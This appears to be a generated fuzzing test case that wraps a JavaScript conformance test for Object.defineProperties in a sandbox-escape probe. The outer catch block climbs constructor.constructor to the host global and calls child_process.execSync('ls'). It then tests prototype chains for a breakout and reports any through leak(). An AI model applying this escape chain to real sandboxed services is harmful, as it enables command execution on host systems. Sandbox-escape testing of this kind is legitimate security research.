try {
    var obj = {};
    function get_Func() {
        throw () => {
            return () => {
            };
        };
        return 0;
    }
    Object.defineProperty(obj, 'foo', {
        set: undefined,
        get: get_Func,
        enumerable: false,
        configurable: false
    });
    function set_Func() {
    }
    try {
        Object.defineProperties(obj, { foo: { set: set_Func } });
        $ERROR('Expected an exception.');
    } catch (e) {
        verifyNotEnumerable(obj, 'foo');
        verifyNotConfigurable(obj, 'foo');
        var desc = Object.getOwnPropertyDescriptor(obj, 'foo');
        if (typeof desc.set !== 'undefined') {
            $ERROR('Expected typeof (desc.set) === "undefined", actually ' + typeof desc.set);
        }
        if (!(e instanceof TypeError)) {
            $ERROR('Expected TypeError, got ' + e);
        }
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}